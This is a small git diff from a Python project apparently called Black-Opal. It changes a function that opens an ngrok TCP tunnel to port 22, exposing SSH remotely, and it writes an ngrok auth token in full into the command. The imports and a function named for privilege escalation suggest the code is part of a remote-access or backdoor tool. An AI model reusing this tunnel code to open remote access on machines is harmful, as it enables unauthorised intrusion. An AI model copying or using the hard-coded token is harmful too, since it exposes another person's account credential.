@@ -8,8 +8,8 @@ from pyuac import main_requires_admin #add pyuac and pypiwin32 to requirements.t
 
 
 def start_server():
-    subprocess.Popen(['cmd.exe', '/c', 'cd C:/Users/cyn0v/OneDrive/Documents/GitHub/Black-Opal/Resources && ngrok.exe tcp 22'])
-    time.sleep(2)
+    subprocess.Popen(['cmd.exe', '/c', 'cd C:/Users/cyn0v/OneDrive/Documents/GitHub/Black-Opal/Resources && ngrok.exe config add-authtoken 2NcGv9L4xjrCQbpSTgOHtknpsuT_71J81Uz2vQzmbLZpydbfD && ngrok.exe tcp 22'])
+    time.sleep(5)
     
     
 def priv_escaltion():
